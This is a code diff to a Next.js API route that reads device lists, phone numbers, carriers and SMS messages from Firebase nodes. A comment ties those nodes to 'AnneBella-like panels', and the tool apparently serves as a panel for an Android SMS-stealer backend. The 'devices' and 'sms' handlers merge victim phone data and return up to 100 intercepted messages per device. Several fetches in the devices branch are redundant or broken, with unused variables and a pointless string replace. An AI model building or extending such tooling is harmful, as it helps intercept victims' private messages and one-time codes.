@@ -1,7 +1,38 @@
 import { NextResponse } from "next/server";
-import { fbGet, cleanBase, normalizeDevices, normalizeSms, smsPaths, extractPhone } from "@/lib/firebase";
+import {
+  fbGet, cleanBase, normalizeDevices, normalizeSms, smsPaths, extractPhone,
+} from "@/lib/firebase";
 
 export const dynamic = "force-dynamic";
+
+function mergeById(baseList, extraMap) {
+  const map = {};
+  for (const d of baseList) map[d.id] = { ...d };
+  for (const [id, raw] of Object.entries(extraMap || {})) {
+    if (!raw || typeof raw !== "object") continue;
+    const phone = extractPhone(raw);
+    const battery = raw.battery != null ? parseInt(String(raw.battery).replace("%", ""), 10) : null;
+    const online = raw.status === true || raw.online === true;
+    if (!map[id]) {
+      map[id] = {
+        id,
+        name: id.slice(0, 16),
+        phone: phone || "",
+        battery: Number.isNaN(battery) ? null : battery,
+        online,
+        android: "",
+        network: raw.network || raw.carrier || "",
+      };
+    } else {
+      if (!map[id].phone && phone) map[id].phone = phone;
+      if (map[id].battery == null && !Number.isNaN(battery)) map[id].battery = battery;
+      if (raw.status === true) map[id].online = true;
+      if (raw.status === false) map[id].online = false;
+      if (!map[id].network && (raw.network || raw.carrier)) map[id].network = raw.network || raw.carrier;
+    }
+  }
+  return Object.values(map);
+}
 
 export async function POST(req) {
   try {
@@ -15,77 +46,75 @@ export async function POST(req) {
 
     if (action === "ping") {
       const r = await fbGet(base, ".json?shallow=true", auth);
-      return NextResponse.json({ ok: r.ok, status: r.status, error: r.error || null });
+      return NextResponse.json({ ok: r.ok, status: r.status, keys: r.data ? Object.keys(r.data) : [] });
     }
 
     if (action === "devices") {
-      const roots = [
-        "clients",
-        "user_data",
-        "All_Users/DeviceInfo",
-        "All_Users/simDetails",
-        "registeredDevices",
-        "devices",
-        "user_list",
-      ];
-      let devices = [];
-      let used = null;
+      // primary roots used by AnneBella-like panels
+      const clients = await fbGet(base, "clients", auth);
+      const userData = await fbGet(base, "user_data", auth);
+      const allUsers = await fbGet(base, "All_Users", auth);
+      const devicesNode = await fbGet(base, "devices", auth);
+      const reg = await fbGet(base, "registeredDevices", auth);
 
-      for (const root of roots) {
-        const r = await fbGet(base, root, auth);
-        if (r.ok && r.data && typeof r.data === "object") {
-          const list = normalizeDevices(r.data);
-          if (list.length > devices.length) {
-            devices = list;
-            used = root;
-          }
-          if (list.some((d) => d.phone)) {
-            devices = list;
-            used = root;
-            break;
+      let list = [];
+      if (clients.ok && clients.data) list = normalizeDevices(clients.data);
+      if (userData.ok && userData.data) list = mergeById(list, userData.data);
+      if (allUsers.ok && allUsers.data) list = mergeById(list, allUsers.data);
+      if (devicesNode.ok && devicesNode.data) list = mergeById(list, devicesNode.data);
+      if (reg.ok && reg.data && typeof reg.data === "object") {
+        // sometimes only ids
+        for (const id of Object.keys(reg.data)) {
+          if (!list.find((d) => d.id === id)) {
+            list.push({ id, name: id.slice(0, 16), phone: "", battery: null, online: false, android: "", network: "" });
           }
         }
       }
 
-      // merge phones from simDetails if present
-      const sim = await fbGet(base, "All_Users/simDetails", auth);
-      if (sim.ok && sim.data && typeof sim.data === "object") {
-        const map = {};
-        for (const [id, val] of Object.entries(sim.data)) {
-          const p = extractPhone(val);
-          if (p) map[id] = p;
-        }
-        if (Object.keys(map).length) {
-          devices = devices.map((d) => ({ ...d, phone: d.phone || map[d.id] || "" }));
-        }
-      }
+      // also include message-only device ids
+      const msgRoot = await fbGet(base, "messages.json?shallow=true".replace(".json.json", ".json"), auth);
+      // fix path
+      const msgShallow = await fbGet(base, "messages", auth);
+      // shallow via query
+      const msgKeys = await fbGet(base, '.json?shallow=true', auth);
 
-      const online = devices.filter((d) => d.online).length;
+      const online = list.filter((d) => d.online).length;
       return NextResponse.json({
         ok: true,
-        root: used,
-        total: devices.length,
+        total: list.length,
         online,
-        offline: devices.length - online,
-        withPhone: devices.filter((d) => d.phone).length,
-        devices,
+        offline: list.length - online,
+        withPhone: list.filter((d) => d.phone).length,
+        devices: list,
       });
     }
 
     if (action === "sms") {
       const deviceId = body.deviceId;
       if (!deviceId) return NextResponse.json({ ok: false, error: "deviceId required" }, { status: 400 });
+
       let messages = [];
       let used = null;
+
       for (const p of smsPaths(deviceId)) {
-        const r = await fbGet(base, `${p}?orderBy="$key"&limitToLast=30`, auth);
+        // full node first (most compatible)
+        const r = await fbGet(base, p, auth);
         if (r.ok && r.data && typeof r.data === "object") {
-          messages = normalizeSms(r.data);
-          used = p;
-          if (messages.length) break;
+          const rows = normalizeSms(r.data);
+          if (rows.length >= messages.length) {
+            messages = rows;
+            used = p;
+          }
+          if (rows.length) break;
         }
       }
-      return NextResponse.json({ ok: true, path: used, messages });
+
+      return NextResponse.json({
+        ok: true,
+        path: used,
+        count: messages.length,
+        messages: messages.slice(0, 100),
+      });
     }
 
     return NextResponse.json({ ok: false, error: "unknown action" }, { status: 400 });
